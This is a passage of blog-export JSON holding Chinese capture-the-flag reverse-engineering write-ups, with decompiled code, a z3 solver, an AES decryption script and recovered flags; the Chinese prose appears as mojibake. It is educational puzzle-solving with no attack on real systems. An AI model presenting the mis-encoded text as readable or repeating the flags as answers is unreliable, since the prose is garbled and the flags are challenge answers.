\u0026#39;string\u0026#39;, \u0026#39;input your flag~:\u0026#39;, 0], [ \u0026#39;input\u0026#39;, 0, 0], [ \u0026#39;string\u0026#39;, \u0026#39;your input is:\u0026#39;, 0], [ \u0026#39;string\u0026#39;, 1, 0], [ \u0026#39;string\u0026#39;, \u0026#34;let\u0026#39;s check......\u0026#34;, 0], [ \u0026#39;sleep\u0026#39;, 0.5, 0], [ \u0026#39;add\u0026#39;, 1, [[0 for i in range(5)]]], [ \u0026#39;add\u0026#39;, 1, [[0 for i in range(5)]]], [ \u0026#39;add\u0026#39;, 1, [[0 for i in range(5)]]], [ \u0026#39;add\u0026#39;, 1, [[0 for i in range(5)]]], [ \u0026#39;add\u0026#39;, 1, [[0 for i in range(5)]]], # list_b åŒ…å«5ä¸ªäº”å…ƒlist [ \u0026#39;crypt\u0026#39;, 0, 0], [ \u0026#39;initlist\u0026#39;, 0, 0], [ \u0026#39;basiccheck\u0026#39;, 0, 0], [ \u0026#39;check\u0026#39;, 0, -1], [ \u0026#39;check\u0026#39;, 1, -1], [ \u0026#39;check\u0026#39;, 2, -1], [ \u0026#39;check\u0026#39;, 3, -1], [ \u0026#39;check\u0026#39;, 4, -1], [ \u0026#39;check\u0026#39;, 0, 0], [ \u0026#39;check\u0026#39;, 0, 1], [ \u0026#39;check\u0026#39;, 0, 2], [ \u0026#39;check\u0026#39;, 0, 3], [ \u0026#39;check\u0026#39;, 0, 4], [ \u0026#39;string\u0026#39;, \u0026#39;Goodjob!\u0026#39;, 0], [ \u0026#39;string\u0026#39;, \u0026#39;The flag is vnctf{\u0026#39;, 0], [ \u0026#39;string\u0026#39;, 3, 0], [ \u0026#39;string\u0026#39;, \u0026#39;}\u0026#39;, 0], [ \u0026#39;exit\u0026#39;, 0, 0]] object_a.run() ä¸å¤ªæ‡‚pythonçš„æ³¨è§£ï¼Œè¿™é‡Œå¥½åƒæ˜¯é€šè¿‡ç»™å®šçš„å­—ç¬¦ä¸²è°ƒç”¨ç›¸åº”çš„å‡½æ•°ï¼Ÿ\næ•´ä½“å°±æ˜¯ä¸€ä¸ªäº”é˜¶å¹»æ–¹ï¼Œæœ€åä½¿ç”¨hashlibé‡Œçš„md5ç®—ä¸€ä¸‹\n\u0026gt;\u0026gt;\u0026gt; import hashlib \u0026gt;\u0026gt;\u0026gt; hashlib.new(\u0026#39;md5\u0026#39;, bytes((\u0026#39;02433420112112034430403122130414004132233324100142\u0026#39;), encoding=\u0026#39;utf8\u0026#39;)).hexdigest() \u0026#39;e3a912c1e911ad82544af0c3d753f44f\u0026#39; å¥—ä¸Š vnctf{} å³å¯\nFilpGame å®˜æ–¹WPå†™çš„å¥½ç„å­¦ï¼Œå…¶å®ç”¨z3ä¹Ÿå¯ä»¥è§£çš„\né€†å‘åˆ†æ æ‹–å…¥idaï¼Œé€šè¿‡å­—ç¬¦ä¸²å®šä½åˆ°å…³é”®ä»£ç ã€‚\nsub_401020(\u0026#34;Input: \u0026#34;); sub_401050(\u0026#34;%s\u0026#34;, inputstring, 512); v0 = 0; v13 = 0; if ( inputstring[0] ) { v1 = dword_403398; v2 = dword_40339C; v14 = dword_403398; while ( v0 \u0026lt; 214 ) { v3 = v0; v4 = \u0026amp;inputstring[v0]; v5 = v3 \u0026amp; 1; if ( v5 ) // ç¬¬å¥‡æ•°ä½ { v6 = *v4; if ( (unsigned __int8)(*v4 - \u0026#39;0\u0026#39;) \u0026gt; 9u ) { if ( (unsigned __int8)(v6 - \u0026#39;A\u0026#39;) \u0026gt; 0x19u )// å¤§äºå¤§å†™å­—æ¯æ—¶ { v2 = -1; dword_40339C = -1; } else // å¤§å†™å­—æ¯æ—¶ { v2 = v6 - \u0026#39;7\u0026#39;; dword_40339C = v6 - \u0026#39;7\u0026#39;; } } else // ä¸ºæ•°å­—æ—¶ { v2 = v6 - \u0026#39;0\u0026#39;; dword_40339C = v6 - \u0026#39;0\u0026#39;; } } else // å¶æ•°ä½ { v7 = *v4; if ( (unsigned __int8)(*v4 - \u0026#39;0\u0026#39;) \u0026gt; 9u ) { if ( (unsigned __int8)(v7 - \u0026#39;A\u0026#39;) \u0026gt; 0x19u ) { dword_403398 = -1; break; } v1 = v7 - \u0026#39;7\u0026#39;; } else { v1 = v7 - \u0026#39;0\u0026#39;; } dword_403398 = v1; v14 = v1; } if ( v1 \u0026gt; 0xF || v2 \u0026gt; 0xF ) // ä¸èƒ½å¤§äºF break; if ( v5 ) // å¥‡æ•°æ—¶ï¼Œä¸¤ä½ä¸¤ä½è¿›è¡Œè®¡ç®— { if ( dword_403018 \u0026gt;= (signed int)(v1 + 16 * v2) )// 0FFFFFFFF break; dword_403018 = v1 + 16 * v2; // v1ä¸ºåˆ—ï¼Œv2ä¸ºè¡Œ v8 = 0; do { v9 = v1 + dword_40212C[v8]; // -1 0 0 0 1 å…ˆè¾“å…¥çš„æ•° v10 = v2 + dword_402140[v8]; // 0 0 -1 1 0 åè¾“å…¥çš„æ•° if ( v9 \u0026lt;= 0xF \u0026amp;\u0026amp; v10 \u0026lt;= 0xF ) final_check[v10] ^= 1 \u0026lt;\u0026lt; (15 - v9); // å°†æ‰€é€‰ä½ç½®åŠå‘¨å›´ä¸€åœˆçš„æ•°å­—éƒ½è¿›è¡Œå–åï¼Œä½ç½®ç”¨å¤§å†™åå…­è¿›åˆ¶è¡¨ç¤º v1 = v14; ++v8; } while ( v8 \u0026lt; 5 ); } v0 = v13 + 1; v13 = v0; if ( !inputstring[v0] ) goto LABEL_25; } } else { LABEL_25: v11 = final_check; // ç›®æ ‡ï¼šå‡ä¸º-1 while ( *v11 == -1 ) { ++v11; if ( (signed int)v11 \u0026gt;= (signed int)\u0026amp;unk_40303C ) { sub_401020(\u0026#34;right, vnctf{MD5(%s)}\\n\u0026#34;); return 0; } } } sub_401020(\u0026#34;wrong\\n\u0026#34;); return 0; è„šæœ¬æ±‚è§£ ç®€å•çš„è¯´å°±æ˜¯å·²çŸ¥ä¸€ä¸ª $16\\times 16$ çš„ $01$ æ–¹é˜µï¼Œæ¯æ¬¡å¯¹ä¸€ä¸ªæ ¼å­å–åï¼Œéƒ½ä¼šå¯¹ç›¸é‚»çš„å››ä¸ªæ ¼å­åŒæ ·è¿›è¡Œå–åï¼Œæœ€ç»ˆæ±‚è§£ä¸€ä¸ªæ“ä½œé¡ºåºä½¿å¾—æ‰€æœ‰çš„æ•°å­—ä¸º $1$ã€‚\nä¸€å¼€å§‹å†™äº†ä¸ªå›æº¯ï¼Œç„¶åç›´æ¥ç‚¸äº†ã€‚\nç»è¿‡é˜Ÿå‹çš„æé†’å¼€å§‹ç”¨z3æ±‚è§£ï¼ˆé˜Ÿå‹çš„z3è¿˜æ˜¯ä»æˆ‘è¿™é‡Œå­¦çš„ã€‚ã€‚ã€‚ï¼‰ï¼Œä½†æ²¡æƒ³åˆ°è¸©åˆ°äº†å¥½å¤šå‘ï¼Œä¹Ÿå­¦ä¼šäº†ä¸€äº›z3çš„æ–°ç”¨æ³•ã€‚\nç›´æ¥ä¸Šæœ€åçš„ä»£ç ã€‚\nfrom z3 import * init_check = [ [1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1], [1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0], [1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1], [0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0], [1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0], [1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1], [1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0], [0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0], [0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0], [0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0], [0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1], [1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1], [0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0], [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1], [0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1], [0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0] ] posx = [0, -1, 0, 1, 0] posy = [0, 0, -1, 0, 1] solver = Solver() change = [ [BitVec(\u0026#39;change%x%x\u0026#39; % (i, j), 2) for j in range(16)] for i in range(16) ] for i in range(16): for j in range(16): for k in range(5): if i + posx[k] \u0026gt;= 0 and i + posx[k] \u0026lt; 16 and j + posy[k] \u0026gt;= 0 and j + posy[k] \u0026lt; 16: init_check[i][j] ^= (change[i + posx[k]][j + posy[k]]) for i in range(16): for j in range(16): solver.add(change[i][j] \u0026amp; 2 == 0) for i in range(16): for j in range(16): solver.add(init_check[i][j] == 1) while solver.check() == sat: length = 0 model = solver.model() for i in range(16): for j in range(16): if model[change[i][j]] == 1: length += 2 if length \u0026lt; 220: for i in range(16): for j in range(16): if model[change[i][j]] == 1: print (\u0026#39;%X%X\u0026#39; % (j, i), end = \u0026#39;\u0026#39;) print () condition = [] for i in range(16): for j in range(16): condition.append(change[i][j] != int(\u0026#34;%s\u0026#34; % (model[change[i][j]]))) solver.add(Or(condition)) print (\u0026#39;\\nfinish\u0026#39;) è¿è¡Œç»“æœ\n$ FilpGame python3 solve.py 2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF finish è¿‡ç¨‹ä¸­è¸©åˆ°çš„å‘ï¼š\nè¿™é“é¢˜çš„è¡Œå’Œåˆ—å¾ˆç»•ï¼Œä¸€å®šè¦çœ‹æ¸…æ¥šï¼› ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ŒBitVec å¤§å°ä¸èƒ½è®¾ç½®æˆ $1$ï¼› è¿™é¢˜çš„è§£æœ‰å¾ˆå¤šï¼Œæ‰€ä»¥æœ€åéœ€è¦ç”¨ä¸€ä¸ª condition å’Œ Or æ¥æ‰¾åˆ°æ‰€æœ‰çš„è§£ï¼› å¦‚æœå¯¹æ•°æ²¡æœ‰æœ€åŸºæœ¬çš„çº¦æŸçš„è¯ï¼Œå¯èƒ½ä¼šå‡ºç°ä¸€å † None çš„æƒ…å†µã€‚ ç¨‹åºè¿è¡Œç»“æœ\n$ FilpGame ./FilpGame.exe Input: 2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999 B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF right, vnctf{MD5(2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D8 1949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF)} æœ€åç®—ä¸€ä¸‹md5\n\u0026gt;\u0026gt;\u0026gt; import hashlib \u0026gt;\u0026gt;\u0026gt; hl = hashlib.md5() \u0026gt;\u0026gt;\u0026gt; str = \u0026#39;2050608090A0B0C0D02131417191A1B1527282B2D2E2F213234363B3D36494C4D4E415456575C5D5E50626566686C6F6071787B7C72838587898C8D81949596999B9C9F95A8AAAEA0B1B3B4B7B1C2C3C4C6C9CBCEC0D4D7D9DBDCDED0E1E3E4E5E6E8E9ECEEEFE3F7F8FBF\u0026#39; \u0026gt;\u0026gt;\u0026gt; hl.update(str.encode(encoding=\u0026#39;utf-8\u0026#39;)) \u0026gt;\u0026gt;\u0026gt; hl.hexdigest() \u0026#39;c51a6d6d3929cd2a0192572e604b371d\u0026#39; æ‹¿åˆ°flagï¼\næ€»ç»“ åˆå­¦åˆ°äº†ä¸€äº›z3çš„ç”¨æ³•ï¼ŒçœŸä¸æˆ³ã€‚\nè¿™é“é¢˜å‘Šè¯‰æˆ‘ä»¬ï¼Œä»¥åç®—æ³•é¢˜æ— è„‘ä¸Šz3å°±å®Œäº‹äº†ã€‚ã€‚ã€‚\né¸£è°¢ æ„Ÿè°¢ SSGSS å¸ˆå‚…ï¼Œåœ¨æˆ‘çº ç»“äºå®˜æ–¹WPçš„è§£æ³•æ—¶æé†’æˆ‘è¿˜æœ‰Z3è¿™ä¸ªç¥å¥‡çš„ä¸œè¥¿ï¼\n","date":"2021-03-25T03:06:10Z","permalink":"/post/vnctf2021-filpgame-and-notsudoku/","title":"VNCTF2021 FilpGame and notsudoku"},{"content":"hardsharp (.NET é€†å‘) ä½¿ç”¨exeinfoå‘ç°æ˜¯ C# .NETæ–‡ä»¶\nç›´æ¥ç”¨ dnSpy æ‰“å¼€\næ‰¾åˆ°ä¸»å‡½æ•°\nprivate static void Main(string[] args) { AesClass aesClass = new AesClass(); string text = \u0026#34;\u0026#34;; string strB = \u0026#34;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0\u0026#34;; byte[] array = new byte[] { 81, 82, 87, 81, 82, 87, 68, 92, 94, 86, 93, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18 }; Console.WriteLine(\u0026#34;Welcome to nepnep csharp test! plz input the magical code:\u0026#34;); string text2 = Console.ReadLine(); if (text2.Length != 37) { Console.WriteLine(\u0026#34;Nope!\u0026#34;); Console.ReadKey(); return; } if (text2.Substring(0, 4) != \u0026#34;Nep{\u0026#34; || text2[36] != \u0026#39;}\u0026#39;) { Console.WriteLine(\u0026#34;Nope!\u0026#34;); Console.ReadKey(); return; } for (int i = 0; i \u0026lt; 32; i++) { text += Convert.ToChar((int)(array[i] ^ 51)).ToString(); } if (string.Compare(aesClass.AesEncrypt(text2, text), strB) == 0) { Console.WriteLine(\u0026#34;wow, you pass it!\u0026#34;); Console.ReadKey(); return; } Console.WriteLine(\u0026#34;Nope!\u0026#34;); Console.ReadKey(); } è¿™æ‰æ˜¯çœŸæ­£çš„ç­¾åˆ°é¢˜å§\u0026hellip;\nå‘ç°æ˜¯ AES åŠ å¯†\nè¿›å…¥ AesEncrypt å‡½æ•°çœ‹ä¸€çœ¼\npublic string AesEncrypt(string str, string key) { if (string.IsNullOrEmpty(str)) { return null; } byte[] bytes = Encoding.UTF8.GetBytes(str); byte[] array = new RijndaelManaged { Key = Encoding.UTF8.GetBytes(key), Mode = CipherMode.ECB, Padding = PaddingMode.PKCS7 }.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length); return Convert.ToBase64String(array, 0, array.Length); } å‘ç°ä½¿ç”¨äº† ECB æ¨¡å¼ï¼Œé‚£ä¹ˆç›´æ¥ä¸Šç½‘æ‰¾ä¸ª python è„šæœ¬è®¡ç®—å°±è¡Œ\narray = [81, 82, 87, 81, 82, 87, 68, 92, 94, 86, 93, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18, 18] key = \u0026#39;\u0026#39; for i in array: key += chr(i ^ 51) print (f\u0026#39;key: {key}\u0026#39;) print (f\u0026#39;key length: {len(key)}\u0026#39;) import base64 from Crypto.Cipher import AES message = \u0026#39;1Umgm5LG6lNPyRCd0LktJhJtyBN7ivpq+EKGmTAcXUM+0ikYZL4h4QTHGqH/3Wh0\u0026#39; encrypt_data = message cipher = AES.new(key) result2 = base64.b64decode(encrypt_data) a = cipher.decrypt(result2) a = a.decode(\u0026#39;utf-8\u0026#39;,\u0026#39;ignore\u0026#39;) a = a.rstrip(\u0026#39;\\n\u0026#39;) a = a.rstrip(\u0026#39;\\t\u0026#39;) a = a.rstrip(\u0026#39;\\r\u0026#39;) a = a.replace(\u0026#39;\\x06\u0026#39;,\u0026#39;\u0026#39;) print(\u0026#39;\\n\u0026#39;,\u0026#39;data:\u0026#39;,a) å¾—åˆ°ç»“æœï¼š\nkey: badbadwomen!!!!!!!!!!!!!!!!!!!!! key length: 32 data: Nep{up_up_down_down_B_a_b_A_Nep_nep~} äºŒåå…­è¿›åˆ¶ ï¼ˆc / c++ é€†å‘ï¼‰ å…ˆç”¨exeinfoæ‰“å¼€ï¼Œå‘ç°æ˜¯æ— å£³32ä½c++ä»£ç ã€‚\nç”¨idaæ‰“å¼€ï¼Œæ‰¾åˆ°æœ‰ç”¨çš„å­—ç¬¦ä¸²ï¼Œå®šä½å…³é”®ä»£ç \nvoid __noreturn sub_4010A0() { __int64 v0; // rax char Dst; // [esp+0h] [ebp-108h] memset(\u0026amp;Dst, 0, 0xFFu); dword_403378 = (int)malloc(8u); Memory = (void *)dword_403378; *(_DWORD *)(dword_403378 + 4) = 0; sub_401020(\u0026#34;plz input right num:\\n\u0026#34;, Dst); sub_401060(\u0026#34;%s\u0026#34;, \u0026amp;Dst, 32); v0 = atoi64(\u0026amp;Dst); sub_401120(v0); } è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œå°†å…¶ä¼ å…¥ sub_401120 å‡½æ•°ã€‚\nè¿›å…¥è¿™ä¸ªå‡½æ•°\nvoid __cdecl __noreturn sub_401120(__int64 a1) { signed __int64 v1; // rdi int v2; // eax int v3; // edx char v4; // cl v1 = __PAIR__(a1, HIDWORD(a1)); if ( a1 ) { do { v2 = sub_401F00(__PAIR__(v1, HIDWORD(v1)), 0x1Au, 0); LODWORD(v1) = v3; v4 = byte_402194[HIDWORD(v1) - 26 * v2]; // 2163qwe)(*\u0026amp;^%489$!057@#\u0026gt;\u0026lt;A HIDWORD(v1) = v2; sub_401160(v4 ^ 7); } while ( v1 ); } sub_401190(); } æ ¹æ®é¢˜ç›®ä¿¡æ¯çš„æç¤ºï¼Œè¿™æ˜¯æŠŠè¾“å…¥æ•°å­—è½¬æ¢æˆä¸º26è¿›åˆ¶ï¼Œéšåè¿›è¡Œä¸€ä¸ªå¼‚æˆ–è¿ç®—ï¼Œç„¶åå­˜åˆ°ä¸€ä¸ªåœ°å€é‡Œã€‚\nè¿›å…¥ sub_401190 å‡½æ•°\nvoid __noreturn sub_401190() { _DWORD *v0; // esi int v1; // ecx _DWORD *v2; // ebx unsigned int v3; // edi unsigned int v4; // esi char *v5; // ecx char v6; // dl int v7; // eax int v8; // edi void *v9; // eax int v10; // [esp+10h] [ebp-4h] v0 = Memory; v1 = 0; v10 = 0; v2 = Memory; v3 = strlen(aFb726); if ( v3 ) { v4 = 0; do { if ( !v2 ) break; v5 = \u0026amp;aFb726[v4]; v6 = *(_BYTE *)v2; v7 = v10 + 1; v2 = (_DWORD *)v2[1]; ++v4; if ( v6 != *v5 ) v7 = v10; v1 = v7; v10 = v7; // åˆ¤æ–­æŸå†…å­˜ç§å¯¹åº”ä½ç½®æ˜¯å¦ä¸ aFb726 å­—ç¬¦ä¸²ç›¸åŒï¼Œç›¸åŒå°±åœ¨é•¿åº¦ä¸ŠåŠ  1 } while ( v4 \u0026lt; v3 ); v0 = Memory; } if ( v0 ) { v8 = v1; do { v9 = (void *)v0[1]; dword_403378 = (int)v0; Memory = v9; free(v0); v0 = Memory; --v8; } while ( Memory ); // é‡Šæ”¾å†…å­˜ } else { v8 = -1; } if ( v10 != strlen(aFb726) ) // æ ¹æ®ä¹‹é—´è®¡ç®—çš„ç›¸åŒå­—æ¯æ•°é‡ï¼Œåˆ¤æ–­ä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸åŒ { puts(\u0026#34;flag is Error!!!\u0026#34;); exit(v8); } puts(\u0026#34;flag is Right!!!, please md5(\u0026#39;Nep{you_input_num}\u0026#39;) submit th4 flag\u0026#34;); system(\u0026#34;pause\u0026#34;); exit(v8); } æ‰€ä»¥åªéœ€è¦å°† aFb726 å­—ç¬¦ä¸²è¿›è¡Œåå‘è®¡ç®—å³å¯\n\u0026gt;\u0026gt;\u0026gt; flag = \u0026#39;Fb72\u0026gt;\u0026amp;6\u0026#39; \u0026gt;\u0026gt;\u0026gt; str = \u0026#39;2163qwe)(*\u0026amp;^%489$!057@#\u0026gt;\u0026lt;A\u0026#39; \u0026gt;\u0026gt;\u0026gt; num = [] \u0026gt;\u0026gt;\u0026gt; for c in flag: ... num.append(str.index(chr(ord(c) ^ 7))) ... \u0026gt;\u0026gt;\u0026gt; num [25, 6, 18, 19, 15, 17, 1] \u0026gt;\u0026gt;\u0026gt; sum = 0 \u0026gt;\u0026gt;\u0026gt; for i in num[::-1]: ... sum *= 26 ... sum += i ... \u0026gt;\u0026gt;\u0026gt; sum 518100101 è¿è¡Œç¨‹åºè¿›è¡Œæµ‹è¯•ï¼Œå¾—åˆ°\nplz input right num: 518100101 flag is Right!!!, please md5(\u0026#39;Nep{you_input_num}\u0026#39;) submit th4 flag è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . . æ ¹æ®é¢˜ç›®ä¿¡æ¯ï¼Œè®¡ç®—ä¸€ä¸‹æ•°å­—çš„32ä½å°å†™md5ï¼ˆä¸€å¼€å§‹ç®—çš„æ˜¯ Nep{51\u0026hellip;01} è¿™ä¸ªå­—ç¬¦ä¸²çš„md5ï¼Œå‘ç°ä¸å¯¹ï¼Œæ‰€ä»¥ç®—æ•°å­—çš„è¯•äº†ä¸€ä¸‹ï¼‰\nå¾—åˆ°flag\nNep{967fa25cbea166ded43127f141cff31a} password ï¼ˆå®‰å“é€†å‘ï¼‰ è¿™é“é¢˜åšäº†å¥½ä¹…éƒ½æ²¡åšå‡ºæ¥ï¼Œç»“æœå‘ç°æ˜¯æŠŠbase64çš„ \u0026lsquo;+/\u0026rsquo; è®°åäº†\u0026hellip;\né¦–å…ˆç”¨ jeb æ‰“å¼€ï¼Œæ‰¾åˆ° com.nepnep.app ä¸­çš„ MainActivity\npublic class MainActivity extends AppCompatActivity { public Encrypt en; static { System.loadLibrary(\u0026#34;native-lib\u0026#34;); } public MainActivity() { super(); this.en = new Encrypt(); } protected void onCreate(Bundle arg4) { super.onCreate(arg4); this.setContentView(0x7F0B001C); // activity_main this.findViewById(0x7F080057).setOnClickListener(new View$OnClickListener(this.findViewById(0x7F0800B7), this.findViewById(0x7F0800F2)) { // btn, key, password public void onClick(View arg4) { if(MainActivity.this.verify(this.val$key.getText().toString()) == 0) { System.out.println(this.val$key.getText().toString()); Toast.makeText(MainActivity.this, \u0026#34;keyé”™è¯¯ï¼\u0026#34;, 0).show(); } else if(MainActivity.this.en.file(this.val$passwd.getText().toString().getBytes(), this.val$key.getText().toString())) { Toast.makeText(MainActivity.this, \u0026#34;æ˜æ–‡æ­£ç¡®ï¼Œå¿«å»è§£å‹ç¼©åŒ…è·å–flagå§ï¼\u0026#34;, 0).show(); } else { Toast.makeText(MainActivity.this, \u0026#34;æ˜æ–‡é”™è¯¯ï¼\u0026#34;, 0).show(); } } }); } public native int verify(String arg1) { } } è¿™æ®µä»£ç æ˜¯è¯»å…¥ key å’Œ passwordï¼Œç„¶åå…ˆåˆ¤æ–­ key æ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®çš„è¯åˆ¤æ–­ password æ˜¯å¦æ­£ç¡®\né‚£ä¹ˆè‚¯å®šå…ˆç ´è§£ keyï¼Œå‘ç° verify æ˜¯å¤–éƒ¨å‡½æ•°\næ‰¾åˆ° native-lib.so æ–‡ä»¶ï¼Œæ‹–å…¥idaï¼Œæ‰¾åˆ°å‡½æ•°åé‡Œæœç´¢ java æˆ– verify ä¹‹ç±»çš„ï¼Œæ‰¾åˆ°è¿™ä¸ªåˆ¤æ–­å‡½æ•°\nv4 = (char *)(*(__int64 (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 1352LL))(a1, a3, 0LL); v5 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 1344LL))(a1, v3); memset(\u0026amp;s, 0, 0x3E8uLL); sub_710(v4, (__int64)\u0026amp;s, v5 - 3 * (((unsigned __int64)(\u0026#39;UUUV\u0026#39; * v5) \u0026gt;\u0026gt; 63) + ((unsigned __int64)(\u0026#39;UUUV\u0026#39; * v5) \u0026gt;\u0026gt; 32))); sub_820(\u0026amp;s, (__int64)\u0026amp;v22); // s=\u0026#39;th1s_1s_k3ya!!!!\u0026#39; if ( v5 \u0026lt;= 0 ) goto LABEL_10; v6 = 0; while ( 1 ) // base64 { v11 = v6; if ( v5 \u0026gt;= 3 ) { *((_BYTE *)\u0026amp;v15 + v6) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6)];// abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ *((_BYTE *)\u0026amp;v15 + v6 + 1) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 1)]; *((_BYTE *)\u0026amp;v15 + v6 + 2) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 2)]; v7 = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 3)]; v6 += 4; *((_BYTE *)\u0026amp;v15 + v11 + 3) = v7; goto LABEL_4; } if ( v5 == 1 ) break; if ( v5 == 2 ) { *((_BYTE *)\u0026amp;v15 + v6) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6)]; *((_BYTE *)\u0026amp;v15 + v6 + 1) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 1)]; *((_BYTE *)\u0026amp;v15 + v6 + 2) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 2)]; *((_BYTE *)\u0026amp;v15 + v6 + 3) = \u0026#39;=\u0026#39;; goto LABEL_10; } LABEL_4: v10 = __OFADD__(-3, v5); v8 = v5 == 3; v9 = v5 - 3 \u0026lt; 0; v5 -= 3; if ( (unsigned __int8)(v9 ^ v10) | v8 ) goto LABEL_10; } *((_BYTE *)\u0026amp;v15 + v6) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6)]; *((_BYTE *)\u0026amp;v15 + v6 + 1) = aAbcdefghijklmn[*((char *)\u0026amp;v22 + v6 + 1)]; *(_WORD *)((char *)\u0026amp;v15 + v6 + 2) = \u0026#39;==\u0026#39;; LABEL_10: (*(void (__fastcall **)(__int64, __int64, char *))(*(_QWORD *)a1 + 1360LL))(a1, v3, v4); v12 = _mm_movemask_epi8( _mm_and_si128( _mm_cmpeq_epi8(_mm_load_si128((const __m128i *)\u0026amp;v15), (__m128i)xmmword_BE0), _mm_cmpeq_epi8(_mm_loadu_si128((const __m128i *)((char *)\u0026amp;v15 + 9)), (__m128i)xmmword_BD0)));// 3g6L2PWL2PXFmR+7ise7iq== __android_log_print(4LL, \u0026#34;nepnep\u0026#34;, \u0026#34;%s\u0026#34;, \u0026amp;v15); result = 0LL; if ( v12 == 0xFFFF ) { __android_log_print(4LL, \u0026#34;nepnep\u0026#34;, \u0026#34;key is true!\u0026#34;, v13); result = 1LL; } return result; æˆ‘ä»¬çš„ç›®çš„è‚¯å®šæ˜¯è®© v12 = 0FFFF\nè™½ç„¶å¯¹äº mm ä¹‹ç±»çš„æŒ‡ä»¤ä¸å¤ªæ¸…æ¥šï¼Œä½†å¤§æ¦‚çš„æ„æ€åº”è¯¥è¿˜æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰çš„ï¼Œé‚£ä¹ˆå°±è®© (const __m128i *)\u0026amp;v15), (__m128i)xmmword_BE0) å’Œ ((char *)\u0026amp;v15 + 9)), (__m128i)xmmword_BD0)) ä¸¤ä¸¤ç›¸ç­‰å³å¯\nåœ¨å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°è¿™ä¸¤ä¸ªï¼Œå°±èƒ½å¾—åˆ° 3g6L2PWL2PXFmR+7ise7iq==ï¼Œè¿™ä¸ªçœ‹èµ·æ¥æ˜¯ä¸€ä¸ª base64ï¼Œä½†è§£å‡ºæ¥æ˜¯ä¹±ç ï¼Œæ‰€ä»¥è¿˜æ˜¯å¾—å¾€å‰çœ‹ã€‚ä¸Šé¢ä¸€å¤§æ®µä» while å¼€å§‹çš„ä»£ç ï¼Œæ˜¾ç„¶å°±æ˜¯ base64 çš„æœ€åä¸€æ­¥ï¼Œç‚¹å¼€å­—ç¬¦ä¸²ï¼Œå‘ç°è¿™ä¸ªä¸æ˜¯æ ‡å‡†çš„ base64ã€‚é‚£ä¹ˆæ ¹æ®è¿™ä¸ªå­—ç¬¦ä¸²åå‘æ±‚è§£ base64 å°±å¯ä»¥äº†ã€‚\nå®é™…æ“ä½œæ—¶ï¼Œç»§ç»­é˜…è¯»äº† sub_820 å’Œ sub_710 ä¸¤ä¸ªå‡½æ•°ã€‚åªçœ‹ sub_820 çš„è¯çœ‹ä¸å¤ªæ‡‚ï¼Œå»ºè®®å…ˆçœ‹ sub_710ï¼Œå‘ç° sub_710 ä¸­ï¼Œå°†ä¸€ä¸ªå­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦æ ¹æ® ascii æ•°å€¼ç›´æ¥æ‹†å¼€åˆ°äº†å…«ä¸ª char ä¸Šï¼Œæ¯ä¸ª char å­˜ '0' æˆ– '1' ï¼ˆ 0x30 å’Œ 0x31 